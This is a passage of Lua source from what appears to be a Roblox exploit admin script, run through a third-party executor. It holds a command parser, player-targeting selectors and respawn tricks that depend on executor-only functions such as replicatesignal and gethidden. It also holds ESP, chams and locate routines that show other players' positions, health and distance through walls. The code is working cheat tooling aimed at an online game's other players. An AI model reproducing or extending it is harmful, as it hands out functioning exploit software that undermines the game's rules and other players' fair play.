					t = gui
				end
			end
	
			if t ~= nil and t:GetAttribute("Title") ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 201
				else
					xP = x + 21
				end
				if IYMouse.Y > (IYMouse.ViewSizeY-96) then
					yP = y - 97
				else
					yP = y
				end
				Tooltip.Position = UDim2.new(0, xP, 0, yP)
				Description.Text = t:GetAttribute("Desc")
				if t:GetAttribute("Title") ~= nil then
					Title_3.Text = t:GetAttribute("Title")
				else
					Title_3.Text = ''
				end
				Tooltip.Visible = true
			else
				Tooltip.Visible = false
			end
		end
	
		function FindInTable(tbl,val)
			if tbl == nil then return false end
			for _,v in pairs(tbl) do
				if v == val then return true end
			end 
			return false
		end
	
		function GetInTable(Table, Name)
			for i = 1, #Table do
				if Table[i] == Name then
					return i
				end
			end
			return false
		end
	
		function permadeath(plr)
			if replicatesignal then
				replicatesignal(plr.ConnectDiedSignalBackend)
				task.wait(Players.RespawnTime - 0.1)
			end
		end
	
		function respawn(plr)
			if invisRunning then TurnVisible() end
	
			local rcdEnabled, wasHidden = false, false
			if gethidden then
				rcdEnabled, wasHidden = gethidden(workspace, "RejectCharacterDeletions") ~= Enum.RejectCharacterDeletions.Disabled
			end
	
			if rcdEnabled and replicatesignal then
				replicatesignal(plr.ConnectDiedSignalBackend)
				task.wait(Players.RespawnTime - 0.1)
				replicatesignal(plr.Kill)
			elseif rcdEnabled and not replicatesignal then
				notify("Incompatible Exploit", "Your exploit does not support this command (missing replicatesignal)")
			else
				local char = plr.Character
				local hum = char:FindFirstChildWhichIsA("Humanoid")
				if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
				char:ClearAllChildren()
				local newChar = Instance.new("Model")
				newChar.Parent = workspace
				plr.Character = newChar
				task.wait()
				plr.Character = char
				newChar:Destroy()
			end
		end
	
		local refreshCmd = false
		function refresh(plr)
			refreshCmd = true
			local root = plr.Character:WaitForChild("HumanoidRootPart")
			local pos = root.CFrame
			local pos1 = workspace.CurrentCamera.CFrame
			respawn(plr)
			task.spawn(function()
				plr.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame, workspace.CurrentCamera.CFrame = pos, task.wait() and pos1
				refreshCmd = false
			end)
		end
	
		local lastDeath
	
		function onDied()
			task.spawn(function()
				if pcall(function() Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
						if getRoot(Players.LocalPlayer.Character) then
							lastDeath = getRoot(Players.LocalPlayer.Character).CFrame
						end
					end)
				else
					wait(2)
					onDied()
				end
			end)
		end
	
		Clip = true
		spDelay = 0.1
		Players.LocalPlayer.CharacterAdded:Connect(function()
			NOFLY()
			Floating = false
	
			if not Clip then
				execCmd('clip')
			end
	
			repeat wait() until getRoot(Players.LocalPlayer.Character)
	
			pcall(function()
				if spawnpoint and not refreshCmd and spawnpos ~= nil then
					wait(spDelay)
					getRoot(Players.LocalPlayer.Character).CFrame = spawnpos
				end
			end)
	
			onDied()
		end)
	
		onDied()
	
		function getstring(begin)
			local start = begin-1
			local AA = '' for i,v in pairs(cargs) do
				if i > start then
					if AA ~= '' then
						AA = AA .. ' ' .. v
					else
						AA = AA .. v
					end
				end
			end
			return AA
		end
	
		findCmd=function(cmd_name)
			for i,v in pairs(cmds)do
				if v.NAME:lower()==cmd_name:lower() or FindInTable(v.ALIAS,cmd_name:lower()) then
					return v
				end
			end
			return customAlias[cmd_name:lower()]
		end
	
		function splitString(str,delim)
			local broken = {}
			if delim == nil then delim = "," end
			for w in string.gmatch(str,"[^"..delim.."]+") do
				table.insert(broken,w)
			end
			return broken
		end
	
		cmdHistory = {}
		local lastCmds = {}
		local historyCount = 0
		local split=" "
		local lastBreakTime = 0
		function execCmd(cmdStr,speaker,store)
			cmdStr = cmdStr:gsub("%s+$","")
			task.spawn(function()
				local rawCmdStr = cmdStr
				cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
				local commandsToRun = splitString(cmdStr,"\\")
				for i,v in pairs(commandsToRun) do
					v = string.gsub(v,"%%BackSlash%%","\\")
					local x,y,num = v:find("^(%d+)%^")
					local cmdDelay = 0
					local infTimes = false
					if num then
						v = v:sub(y+1)
						local x,y,del = v:find("^([%d%.]+)%^")
						if del then
							v = v:sub(y+1)
							cmdDelay = tonumber(del) or 0
						end
					else
						local x,y = v:find("^inf%^")
						if x then
							infTimes = true
							v = v:sub(y+1)
							local x,y,del = v:find("^([%d%.]+)%^")
							if del then
								v = v:sub(y+1)
								del = tonumber(del) or 1
								cmdDelay = (del > 0 and del or 1)
							else
								cmdDelay = 1
							end
						end
					end
					num = tonumber(num or 1)
	
					if v:sub(1,1) == "!" then
						local chunks = splitString(v:sub(2),split)
						if chunks[1] and lastCmds[chunks[1]] then v = lastCmds[chunks[1]] end
					end
	
					local args = splitString(v,split)
					local cmdName = args[1]
					local cmd = findCmd(cmdName)
					if cmd then
						table.remove(args,1)
						cargs = args
						if not speaker then speaker = Players.LocalPlayer end
						if store then
							if speaker == Players.LocalPlayer then
								if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
									table.insert(cmdHistory,1,rawCmdStr)
								end
							end
							if #cmdHistory > 30 then table.remove(cmdHistory) end
	
							lastCmds[cmdName] = v
						end
						local cmdStartTime = tick()
						if infTimes then
							while lastBreakTime < cmdStartTime do
								local success,err = pcall(cmd.FUNC,args, speaker)
								if not success and _G.IY_DEBUG then
									warn("Command Error:", cmdName, err)
								end
								wait(cmdDelay)
							end
						else
							for rep = 1,num do
								if lastBreakTime > cmdStartTime then break end
								local success,err = pcall(function()
									cmd.FUNC(args, speaker)
								end)
								if not success and _G.IY_DEBUG then
									warn("Command Error:", cmdName, err)
								end
								if cmdDelay ~= 0 then wait(cmdDelay) end
							end
						end
					end
				end
			end)
		end	
	
		function addcmd(name,alias,func,plgn)
			cmds[#cmds+1]=
				{
					NAME=name;
					ALIAS=alias or {};
					FUNC=func;
					PLUGIN=plgn;
				}
		end
	
		function removecmd(cmd)
			if cmd ~= " " then
				for i = #cmds,1,-1 do
					if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
						table.remove(cmds, i)
						for a,c in pairs(CMDsF:GetChildren()) do
							if string.find(c.Text, "^"..cmd.."$") or string.find(c.Text, "^"..cmd.." ") or string.find(c.Text, " "..cmd.."$") or string.find(c.Text, " "..cmd.." ") then
								c.TextTransparency = 0.7
								c.MouseButton1Click:Connect(function()
									notify(c.Text, "Command has been disabled by you or a plugin")
								end)
							end
						end
					end
				end
			end
		end
	
		function overridecmd(name, func)
			local cmd = findCmd(name)
			if cmd and cmd.FUNC then cmd.FUNC = func end
		end
	
		function addbind(cmd,key,iskeyup,toggle)
			if toggle then
				binds[#binds+1]=
					{
						COMMAND=cmd;
						KEY=key;
						ISKEYUP=iskeyup;
						TOGGLE = toggle;
					}
			else
				binds[#binds+1]=
					{
						COMMAND=cmd;
						KEY=key;
						ISKEYUP=iskeyup;
					}
			end
		end
	
		function addcmdtext(text,name,desc)
			local newcmd = Example:Clone()
			local tooltipText = tostring(text)
			local tooltipDesc = tostring(desc)
			newcmd.Parent = CMDsF
			newcmd.Visible = false
			newcmd.Text = text
			newcmd.Name = 'PLUGIN_'..name
			table.insert(text1,newcmd)
			if desc and desc ~= '' then
				newcmd:SetAttribute("Title", tooltipText)
				newcmd:SetAttribute("Desc", tooltipDesc)
				newcmd.MouseButton1Down:Connect(function()
					if newcmd.Visible and newcmd.TextTransparency == 0 then
						Cmdbar:CaptureFocus()
						autoComplete(newcmd.Text)
						maximizeHolder()
					end
				end)
			end
		end
	
		local WorldToScreen = function(Object)
			local ObjectVector = workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
			return Vector2.new(ObjectVector.X, ObjectVector.Y)
		end
	
		local MousePositionToVector2 = function()
			return Vector2.new(IYMouse.X, IYMouse.Y)
		end
	
		local GetClosestPlayerFromCursor = function()
			local found = nil
			local ClosestDistance = math.huge
			for i, v in pairs(Players:GetPlayers()) do
				if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChildOfClass("Humanoid") then
					for k, x in pairs(v.Character:GetChildren()) do
						if string.find(x.Name, "Torso") then
							local Distance = (WorldToScreen(x) - MousePositionToVector2()).Magnitude
							if Distance < ClosestDistance then
								ClosestDistance = Distance
								found = v
							end
						end
					end
				end
			end
			return found
		end
	
		SpecialPlayerCases = {
			["all"] = function(speaker) return Players:GetPlayers() end,
			["others"] = function(speaker)
				local plrs = {}
				for i,v in pairs(Players:GetPlayers()) do
					if v ~= speaker then
						table.insert(plrs,v)
					end
				end
				return plrs
			end,
			["me"] = function(speaker)return {speaker} end,
			["#(%d+)"] = function(speaker,args,currentList)
				local returns = {}
				local randAmount = tonumber(args[1])
				local players = {unpack(currentList)}
				for i = 1,randAmount do
					if #players == 0 then break end
					local randIndex = math.random(1,#players)
					table.insert(returns,players[randIndex])
					table.remove(players,randIndex)
				end
				return returns
			end,
			["random"] = function(speaker,args,currentList)
				local players = Players:GetPlayers()
				local localplayer = Players.LocalPlayer
				table.remove(players, table.find(players, localplayer))
				return {players[math.random(1,#players)]}
			end,
			["%%(.+)"] = function(speaker,args)
				local returns = {}
				local team = args[1]
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["allies"] = function(speaker)
				local returns = {}
				local team = speaker.Team
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Team == team then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["enemies"] = function(speaker)
				local returns = {}
				local team = speaker.Team
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Team ~= team then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["team"] = function(speaker)
				local returns = {}
				local team = speaker.Team
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Team == team then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["nonteam"] = function(speaker)
				local returns = {}
				local team = speaker.Team
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Team ~= team then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["friends"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["nonfriends"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["guests"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Guest then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["bacons"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["age(%d+)"] = function(speaker,args)
				local returns = {}
				local age = tonumber(args[1])
				if not age == nil then return end
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.AccountAge <= age then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["nearest"] = function(speaker,args,currentList)
				local speakerChar = speaker.Character
				if not speakerChar or not getRoot(speakerChar) then return end
				local lowest = math.huge
				local NearestPlayer = nil
				for _,plr in pairs(currentList) do
					if plr ~= speaker and plr.Character then
						local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
						if distance < lowest then
							lowest = distance
							NearestPlayer = {plr}
						end
					end
				end
				return NearestPlayer
			end,
			["farthest"] = function(speaker,args,currentList)
				local speakerChar = speaker.Character
				if not speakerChar or not getRoot(speakerChar) then return end
				local highest = 0
				local Farthest = nil
				for _,plr in pairs(currentList) do
					if plr ~= speaker and plr.Character then
						local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
						if distance > highest then
							highest = distance
							Farthest = {plr}
						end
					end
				end
				return Farthest
			end,
			["group(%d+)"] = function(speaker,args)
				local returns = {}
				local groupID = tonumber(args[1])
				for _,plr in pairs(Players:GetPlayers()) do
					if plr:IsInGroup(groupID) then  
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["alive"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["dead"] = function(speaker,args)
				local returns = {}
				for _,plr in pairs(Players:GetPlayers()) do
					if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
						table.insert(returns,plr)
					end
				end
				return returns
			end,
			["rad(%d+)"] = function(speaker,args)
				local returns = {}
				local radius = tonumber(args[1])
				local speakerChar = speaker.Character
				if not speakerChar or not getRoot(speakerChar) then return end
				for _,plr in pairs(Players:GetPlayers()) do
					if plr.Character and getRoot(plr.Character) then
						local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
						if magnitude <= radius then table.insert(returns,plr) end
					end
				end
				return returns
			end,
			["cursor"] = function(speaker)
				local plrs = {}
				local v = GetClosestPlayerFromCursor()
				if v ~= nil then table.insert(plrs, v) end
				return plrs
			end,
			["npcs"] = function(speaker,args)
				local returns = {}
				for _, v in pairs(workspace:GetDescendants()) do
					if v:IsA("Model") and getRoot(v) and v:FindFirstChildWhichIsA("Humanoid") and Players:GetPlayerFromCharacter(v) == nil then
						local clone = Instance.new("Player")
						clone.Name = v.Name .. " - " .. v:FindFirstChildWhichIsA("Humanoid").DisplayName
						clone.Character = v
						table.insert(returns, clone)
					end
				end
				return returns
			end,
		}
	
		function toTokens(str)
			local tokens = {}
			for op,name in string.gmatch(str,"([+-])([^+-]+)") do
				table.insert(tokens,{Operator = op,Name = name})
			end
			return tokens
		end
	
		function onlyIncludeInTable(tab,matches)
			local matchTable = {}
			local resultTable = {}
			for i,v in pairs(matches) do matchTable[v.Name] = true end
			for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
			return resultTable
		end
	
		function removeTableMatches(tab,matches)
			local matchTable = {}
			local resultTable = {}
			for i,v in pairs(matches) do matchTable[v.Name] = true end
			for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
			return resultTable
		end
	
		function getPlayersByName(Name)
			local Name,Len,Found = string.lower(Name),#Name,{}
			for _,v in pairs(Players:GetPlayers()) do
				if Name:sub(0,1) == '@' then
					if string.sub(string.lower(v.Name),1,Len-1) == Name:sub(2) then
						table.insert(Found,v)
					end
				else
					if string.sub(string.lower(v.Name),1,Len) == Name or string.sub(string.lower(v.DisplayName),1,Len) == Name then
						table.insert(Found,v)
					end
				end
			end
			return Found
		end
	
		function getPlayer(list,speaker)
			if list == nil then return {speaker.Name} end
			local nameList = splitString(list,",")
	
			local foundList = {}
	
			for _,name in pairs(nameList) do
				if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
				local tokens = toTokens(name)
				local initialPlayers = Players:GetPlayers()
	
				for i,v in pairs(tokens) do
					if v.Operator == "+" then
						local tokenContent = v.Name
						local foundCase = false
						for regex,case in pairs(SpecialPlayerCases) do
							local matches = {string.match(tokenContent,"^"..regex.."$")}
							if #matches > 0 then
								foundCase = true
								initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
							end
						end
						if not foundCase then
							initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
						end
					else
						local tokenContent = v.Name
						local foundCase = false
						for regex,case in pairs(SpecialPlayerCases) do
							local matches = {string.match(tokenContent,"^"..regex.."$")}
							if #matches > 0 then
								foundCase = true
								initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
							end
						end
						if not foundCase then
							initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
						end
					end
				end
	
				for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
			end
	
			local foundNames = {}
			for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
	
			return foundNames
		end
	
		function formatUsername(player)
			if player.DisplayName ~= player.Name then
				return string.format("%s (%s)", player.Name, player.DisplayName)
			end
			return player.Name
		end
	
		getprfx=function(strn)
			if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
			end return
		end
	
		function do_exec(str, plr)
			str = str:gsub('/e ', '')
			local t = getprfx(str)
			if not t then return end
			str = str:sub(t[2])
			if t[1]=='cmd' then
				execCmd(str, plr, true)
				IndexContents('',true,false,true)
				CMDsF.CanvasPosition = canvasPos
			end
		end
	
		lastTextBoxString,lastTextBoxCon,lastEnteredString = nil,nil,nil
	
		UserInputService.TextBoxFocused:Connect(function(obj)
			if lastTextBoxCon then lastTextBoxCon:Disconnect() end
			if obj == Cmdbar then lastTextBoxString = nil return end
			lastTextBoxString = obj.Text
			lastTextBoxCon = obj:GetPropertyChangedSignal("Text"):Connect(function()
				if not (UserInputService:IsKeyDown(Enum.KeyCode.Return) or UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter)) then
					lastTextBoxString = obj.Text
				end
			end)
		end)
	
		UserInputService.InputBegan:Connect(function(input,gameProcessed)
			if gameProcessed then
				if Cmdbar and Cmdbar:IsFocused() then
					if input.KeyCode == Enum.KeyCode.Up then
						historyCount = historyCount + 1
						if historyCount > #cmdHistory then historyCount = #cmdHistory end
						Cmdbar.Text = cmdHistory[historyCount] or ""
						Cmdbar.CursorPosition = 1020
					elseif input.KeyCode == Enum.KeyCode.Down then
						historyCount = historyCount - 1
						if historyCount < 0 then historyCount = 0 end
						Cmdbar.Text = cmdHistory[historyCount] or ""
						Cmdbar.CursorPosition = 1020
					end
				elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
					lastEnteredString = lastTextBoxString
				end
			end
		end)
	
		Players.LocalPlayer.Chatted:Connect(function()
			wait()
			if lastEnteredString then
				local message = lastEnteredString
				lastEnteredString = nil
				do_exec(message, Players.LocalPlayer)
			end
		end)
	
		Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
		Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
			if Cmdbar:IsFocused() then
				IndexContents(Cmdbar.Text,true,true)
			end
		end)
	
		local tabComplete = nil
		tabAllowed = true
		Cmdbar.FocusLost:Connect(function(enterpressed)
			if enterpressed then
				local cmdbarText = Cmdbar.Text:gsub("^"..prefix,"")
				execCmd(cmdbarText,Players.LocalPlayer,true)
			end
			if tabComplete then tabComplete:Disconnect() end
			wait()
			if not Cmdbar:IsFocused() then
				Cmdbar.Text = ""
				IndexContents('',true,false,true)
				if SettingsOpen == true then
					wait(0.2)
					Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
					CMDsF.Visible = false
				end
			end
			CMDsF.CanvasPosition = canvasPos
		end)
	
		Cmdbar.Focused:Connect(function()
			historyCount = 0
			canvasPos = CMDsF.CanvasPosition
			if SettingsOpen == true then
				wait(0.2)
				CMDsF.Visible = true
				Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
			end
			tabComplete = UserInputService.InputBegan:Connect(function(input,gameProcessed)
				if Cmdbar:IsFocused() then
					if tabAllowed == true and input.KeyCode == Enum.KeyCode.Tab and topCommand ~= nil then
						autoComplete(topCommand)
					end
				else
					tabComplete:Disconnect()
				end
			end)
		end)
	
		ESPenabled = false
		CHMSenabled = false
	
		function round(num, numDecimalPlaces)
			local mult = 10^(numDecimalPlaces or 0)
			return math.floor(num * mult + 0.5) / mult
		end
	
		function ESP(plr, logic)
			task.spawn(function()
				for i,v in pairs(COREGUI:GetChildren()) do
					if v.Name == plr.Name..'_ESP' then
						v:Destroy()
					end
				end
				wait()
				if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
					local ESPholder = Instance.new("Folder")
					ESPholder.Name = plr.Name..'_ESP'
					ESPholder.Parent = COREGUI
					repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
					for b,n in pairs (plr.Character:GetChildren()) do
						if (n:IsA("BasePart")) then
							local a = Instance.new("BoxHandleAdornment")
							a.Name = plr.Name
							a.Parent = ESPholder
							a.Adornee = n
							a.AlwaysOnTop = true
							a.ZIndex = 10
							a.Size = n.Size
							a.Transparency = espTransparency
							if logic == true then
								a.Color = BrickColor.new(plr.TeamColor == Players.LocalPlayer.TeamColor and "Bright green" or "Bright red")
							else
								a.Color = plr.TeamColor
							end
						end
					end
					if plr.Character and plr.Character:FindFirstChild('Head') then
						local BillboardGui = Instance.new("BillboardGui")
						local TextLabel = Instance.new("TextLabel")
						BillboardGui.Adornee = plr.Character.Head
						BillboardGui.Name = plr.Name
						BillboardGui.Parent = ESPholder
						BillboardGui.Size = UDim2.new(0, 100, 0, 150)
						BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
						BillboardGui.AlwaysOnTop = true
						TextLabel.Parent = BillboardGui
						TextLabel.BackgroundTransparency = 1
						TextLabel.Position = UDim2.new(0, 0, 0, -50)
						TextLabel.Size = UDim2.new(0, 100, 0, 100)
						TextLabel.Font = Enum.Font.SourceSansSemibold
						TextLabel.TextSize = 20
						TextLabel.TextColor3 = Color3.new(1, 1, 1)
						TextLabel.TextStrokeTransparency = 0
						TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
						TextLabel.Text = 'Name: '..plr.Name
						TextLabel.ZIndex = 10
						local espLoopFunc
						local teamChange
						local addedFunc
						addedFunc = plr.CharacterAdded:Connect(function()
							if ESPenabled then
								espLoopFunc:Disconnect()
								teamChange:Disconnect()
								ESPholder:Destroy()
								repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
								ESP(plr, logic)
								addedFunc:Disconnect()
							else
								teamChange:Disconnect()
								addedFunc:Disconnect()
							end
						end)
						teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
							if ESPenabled then
								espLoopFunc:Disconnect()
								addedFunc:Disconnect()
								ESPholder:Destroy()
								repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
								ESP(plr, logic)
								teamChange:Disconnect()
							else
								teamChange:Disconnect()
							end
						end)
						local function espLoop()
							if COREGUI:FindFirstChild(plr.Name..'_ESP') then
								if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
									local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
									TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
								end
							else
								teamChange:Disconnect()
								addedFunc:Disconnect()
								espLoopFunc:Disconnect()
							end
						end
						espLoopFunc = RunService.RenderStepped:Connect(espLoop)
					end
				end
			end)
		end
	
		function CHMS(plr)
			task.spawn(function()
				for i,v in pairs(COREGUI:GetChildren()) do
					if v.Name == plr.Name..'_CHMS' then
						v:Destroy()
					end
				end
				wait()
				if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_CHMS') then
					local ESPholder = Instance.new("Folder")
					ESPholder.Name = plr.Name..'_CHMS'
					ESPholder.Parent = COREGUI
					repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
					for b,n in pairs (plr.Character:GetChildren()) do
						if (n:IsA("BasePart")) then
							local a = Instance.new("BoxHandleAdornment")
							a.Name = plr.Name
							a.Parent = ESPholder
							a.Adornee = n
							a.AlwaysOnTop = true
							a.ZIndex = 10
							a.Size = n.Size
							a.Transparency = espTransparency
							a.Color = plr.TeamColor
						end
					end
					local addedFunc
					local teamChange
					local CHMSremoved
					addedFunc = plr.CharacterAdded:Connect(function()
						if CHMSenabled then
							ESPholder:Destroy()
							teamChange:Disconnect()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							CHMS(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if CHMSenabled then
							ESPholder:Destroy()
							addedFunc:Disconnect()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
							CHMS(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					CHMSremoved = ESPholder.AncestryChanged:Connect(function()
						teamChange:Disconnect()
						addedFunc:Disconnect()
						CHMSremoved:Disconnect()
					end)
				end
			end)
		end
	
		function Locate(plr)
			task.spawn(function()
				for i,v in pairs(COREGUI:GetChildren()) do
					if v.Name == plr.Name..'_LC' then
						v:Destroy()
					end
				end
				wait()
				if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_LC') then
					local ESPholder = Instance.new("Folder")
					ESPholder.Name = plr.Name..'_LC'
					ESPholder.Parent = COREGUI
					repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
					for b,n in pairs (plr.Character:GetChildren()) do
						if (n:IsA("BasePart")) then
							local a = Instance.new("BoxHandleAdornment")
							a.Name = plr.Name
							a.Parent = ESPholder
							a.Adornee = n
							a.AlwaysOnTop = true
							a.ZIndex = 10
							a.Size = n.Size
							a.Transparency = espTransparency
							a.Color = plr.TeamColor
						end
					end
					if plr.Character and plr.Character:FindFirstChild('Head') then
						local BillboardGui = Instance.new("BillboardGui")
						local TextLabel = Instance.new("TextLabel")
						BillboardGui.Adornee = plr.Character.Head
						BillboardGui.Name = plr.Name
						BillboardGui.Parent = ESPholder
						BillboardGui.Size = UDim2.new(0, 100, 0, 150)
						BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
						BillboardGui.AlwaysOnTop = true
						TextLabel.Parent = BillboardGui
						TextLabel.BackgroundTransparency = 1
						TextLabel.Position = UDim2.new(0, 0, 0, -50)
						TextLabel.Size = UDim2.new(0, 100, 0, 100)
						TextLabel.Font = Enum.Font.SourceSansSemibold
						TextLabel.TextSize = 20
						TextLabel.TextColor3 = Color3.new(1, 1, 1)
						TextLabel.TextStrokeTransparency = 0
						TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
						TextLabel.Text = 'Name: '..plr.Name
						TextLabel.ZIndex = 10
						local lcLoopFunc
						local addedFunc
						local teamChange
						addedFunc = plr.CharacterAdded:Connect(function()
							if ESPholder ~= nil and ESPholder.Parent ~= nil then
								lcLoopFunc:Disconnect()
								teamChange:Disconnect()
								ESPholder:Destroy()
								repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
								Locate(plr)
								addedFunc:Disconnect()
							else
								teamChange:Disconnect()
								addedFunc:Disconnect()
							end
						end)
						teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
							if ESPholder ~= nil and ESPholder.Parent ~= nil then
								lcLoopFunc:Disconnect()
								addedFunc:Disconnect()
								ESPholder:Destroy()
								repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid")
								Locate(plr)
								teamChange:Disconnect()
							else
								teamChange:Disconnect()
							end
						end)
						local function lcLoop()
							if COREGUI:FindFirstChild(plr.Name..'_LC') then
								if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
									local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
									TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
								end
							else
								teamChange:Disconnect()
								addedFunc:Disconnect()
								lcLoopFunc:Disconnect()
							end
						end
						lcLoopFunc = RunService.RenderStepped:Connect(lcLoop)
					end
				end
			end)
		end
	
		local bindsGUI = KeybindEditor
		local awaitingInput = false
		local keySelected = false
	
		function refreshbinds()
			if Holder_2 then
				Holder_2:ClearAllChildren()
				Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
				for i = 1, #binds do
					local YSize = 25
					local Position = ((i * YSize) - YSize)
					local newbind = Example_2:Clone()
					newbind.Parent = Holder_2
					newbind.Visible = true
					newbind.Position = UDim2.new(0,0,0, Position + 5)
					table.insert(shade2,newbind)
					table.insert(shade2,newbind.Text)
					table.insert(text1,newbind.Text)
					table.insert(shade3,newbind.Text.Delete)
					table.insert(text2,newbind.Text.Delete)
					local input = tostring(binds[i].KEY)
					local key
					if input == 'RightClick' or input == 'LeftClick' then
						key = input
					else
						key = input:sub(14)
					end
					if binds[i].TOGGLE then
						newbind.Text.Text = key.." > "..binds[i].COMMAND.." / "..binds[i].TOGGLE
					else
						newbind.Text.Text = key.." > "..binds[i].COMMAND.."  "..(binds[i].ISKEYUP and "(keyup)" or "(keydown)")
					end
					Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
